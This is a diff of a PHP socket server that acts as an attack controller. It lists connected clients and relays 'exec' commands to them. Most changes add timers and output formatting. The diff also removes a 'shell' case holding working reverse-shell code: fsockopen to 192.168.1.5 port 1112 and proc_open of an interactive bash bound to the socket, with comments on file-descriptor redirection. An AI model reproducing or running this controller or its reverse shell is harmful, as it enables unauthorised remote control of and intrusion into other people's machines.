@@ -3,6 +3,10 @@
 
 	set_time_limit(0);
 	ob_implicit_flush(1);
+	define("DELIMITER", "-------------------------------------");
+
+	include_once 'Timer.php';
+	$timer = new Timer();
 
 	if($argc<3){
 		die("Assign host addr and port\n");
@@ -48,7 +52,9 @@
 	$cnt 			 = 0;
 
 	while (true) {
-	       
+	
+	    $loop_timer = new Timer();
+
 	    // create a copy, so $clients doesn't get modified by socket_select()
 		$write = $recv = $clients;
 		$except = NULL;
@@ -100,7 +106,7 @@
           	$data = trim($data);
     
 	        if(!empty($data))
-		    	echo "Client [\33[95m".$ip.":".$port."\33[0m] :".$data."\n";
+		    	echo "[".$now."] Client [\33[95m".$ip.":".$port."\33[0m]\n".DELIMITER."\n".$data."\n".DELIMITER."\n";
 
     	   	// $clients minus master socket
 	    	// $cstm = array of connected clients (ip:port)
@@ -111,12 +117,13 @@
 		    	$line = "";	
 		}
 
-		
+
 		// cnt > 1 => current client off => infinite loop
     	if(@preg_match('/^(exec)\s\w+/', $line) && $cnt < 2)
     	{
     		echo ($cnt < 1) ? "Executing..\n" : "\33[91mExecute failed..\33[0m\n";
     		$cnt++;
+
     		sleep(1);	// wait 1 sec until client/s send callback
     		continue;
     	}
@@ -163,65 +170,27 @@
 		}
 
 	    switch ($line) {
+
 	    	case 'clients':
 	    		echo "\33[95mClients: ".(count($clients)-1)."\33[0m\n";
 	    		print_r($cstm);
 	    		break;
+
 	    	case 'exit':
 				echo "Closing master socket..\n";
 				socket_close($master_sock);	
 				exit();
-			case 'shell':
-
-				// 0=stdin
-				// 1=stdout
-				// 2=stderr
-
-				// ">&"				===> re-directs output of one file to another
-				// 0<&-, <&- 		===> close stdin
-				// 1>&-, >&- 		===> close stout
-				// 'n<&-' or 'n>&-' ===> close input/output fd 'n'
-
-				//  <&2 			===> stdin to stderr
-				//  >&2				===> all stdout to stderr
-				//	1>&2			===> stdout to stderr
-
-				
-				chdir("/");
-
-				$sock = fsockopen("192.168.1.5",1112);
-			 	$descriptorspec = array(
-			        0 => array("pipe", "r"),	// stdin
-			        1 => array("pipe", "w"),	// stdout
-			        2 => array("pipe", "w"),    // stderr
-			    	3 => $sock 					// socket file descriptor
-			    );
-			    $command = 'uname -a; w; id; >&1 /bin/bash -i <&3 >&3 2>&3;';
-			    $process = proc_open($command, $descriptorspec, $pipes);
-
-			    if (!is_resource($process)) {
-			    	echo "Shell spawn failed.\n";
-			    	exit(1);
-				}
-
-			    fclose($pipes[0]);
-			    fclose($pipes[1]);
-			    fclose($pipes[2]);
-			    fclose($sock);
-
-			    $return_value = proc_close($process);
-				break;
-
 
 			case 'options':
 				echo options();
 				break;
+
 	    	default:
 	    		break;
 	    }
 
 
-		if(count($clients) === 1)	// only master socket = no clients
+		if(count($clients) === 1)	// only master socket => no clients
 		{
 			echo "\33[38;5;208mNo connected clients..\33[0m\nListening..\n";
 			$line = "";
@@ -245,9 +214,16 @@
 			    }
 			}
 		}
+
+    	if($loop_timer->get_execution_time() > 3)
+    	{
+    		echo "Timer of 3 sec passed\n\n";
+    	}
+		unset($loop_timer);
 	}
 
 	echo "Closing master socket..\n";
+	unset($timer);
 	socket_close($master_sock);
 	exit(0);
 
